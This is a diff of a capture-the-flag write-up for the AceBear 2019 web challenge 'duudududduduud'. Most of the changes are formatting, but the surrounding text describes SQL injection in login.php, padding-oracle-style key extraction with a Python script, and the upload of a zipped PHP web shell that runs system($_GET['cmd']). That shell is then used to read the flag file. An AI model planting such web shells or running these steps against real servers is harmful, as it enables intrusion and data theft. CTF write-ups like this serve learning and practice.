@@ -6,14 +6,14 @@ And a hint : backup.bak?
 ```
 ![website](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/website.png)
 > The hint is backup.bak <br>
-> Which Means there is a backup file , http://54.169.92.223/backup.bak
-> Dowloaded the backup.bak and rename to backup.tgz & Extract it
-> There we get the source code
+> Which Means there is a backup file , http://54.169.92.223/backup.bak <br>
+> Dowloaded the backup.bak and rename to backup.tgz & Extract it <br>
+> There we get the source code <br>
 
 ### On Inscepting the [soure code](https://github.com/D1r3Wolf/CTF-writeups/tree/master/Acebear-2019/duudududduduud/backup)
-> We need to be a admin in order to upload files
-> No one can became an admin
-* But There is bug to expliot to became a admin
+> We need to be a admin in order to upload files <br>
+> No one can became an admin <br>
+* But There is bug to expliot to became a admin 
 > An SQL injection in [login.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/login.php) & This is the only SQL injection in the site
 ![sql](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/login-php.png)
 ```php
@@ -100,7 +100,7 @@ else
 }
 // Here the $tmp is plaintext ; It returns a Error Msg with plaintext
 ```
-### Extracting the IV [key.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/key.py)
+### Extracting the IV :: [key.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/key.py)
 ```py 
 from requests import session
 from base64 import b64encode,b64decode
@@ -132,7 +132,7 @@ $ python exp.py
 m4ga9-r21kc,!@$!
 $
 ```
-> Now we got the Key ; We can send whatever we want by encrypting 
+> Now we got the Key ; We can send whatever we want by encrypting <br>
 > The server decrypt's it and places it in sql query
 ### Checking the Injection
 ```
@@ -195,8 +195,8 @@ session_remember : 1FpxWQyccSU6z6xePwv990SfdilJUgIUpg0RHTss5Zcq92uLD6Va4KjpdHpBz
 ### here we go
 ![admin](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/admin.png)
 > There is a upload option for admin
-[upload](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload.png)
-> Now on checking the [upload.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/upload.php)
+[upload](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload.png)<br>
+> Now on checking the [upload.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/upload.php)<br>
 ```php
 $json = json_decode(file_get_contents($_SESSION["folder"]."/manifest.json"),true);
 if ($json["type"] !== "h4x0r" || !isset($json["name"]))
@@ -226,14 +226,14 @@ if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo
 ```
 > zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server
 ![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
-> It Provides a path uploads/a3d7ebbe913126890938bdfe90833490/
+> It Provides a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
 > Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/
 ![upload2](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload2.png)
 > Now there is our cmd.php ; use it to RCE
 ![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)
-> OUR backdoor is working ;
-> By the Given source code we can know that flag is at `lib/connection.php` 
-> path is `../../lib/connection.php`
+> OUR backdoor is working ;<br>
+> By the Given source code we can know that flag is at [lib/connection.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/lib/connection.php) <br>
+> path is `../../lib/connection.php`<br>
 > exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
 > view source is important as the browser try's to parses it ,Didn't display the php file properly
 ![flag](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/flag.png)
